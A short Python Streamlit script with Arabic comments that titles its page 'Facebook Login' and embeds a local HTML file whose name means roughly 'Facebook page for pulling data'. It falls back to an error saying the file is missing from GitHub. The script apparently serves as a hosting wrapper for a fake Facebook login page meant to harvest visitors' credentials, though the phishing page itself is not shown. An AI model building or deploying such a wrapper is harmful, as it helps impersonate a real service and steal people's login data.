import streamlit as st
import streamlit.components.v1 as components

# 1. إعداد الصفحة
st.set_page_config(page_title="Facebook Login", layout="centered")

# 2. قراءة ملف الـ HTML
try:
    with open("صفحه فيس لسحب البيانات.html", "r", encoding="utf-8") as f:
        html_code = f.read()
    
    # 3. عرض الصفحة (تم التصحيح هنا: نمرر html_code مباشرة)
    components.html(html_code, height=800, scrolling=True)

except FileNotFoundError:
    st.error("⚠️ خطأ: ملف الـ HTML غير موجود على GitHub. تأكد من رفعه بنفس الاسم.")
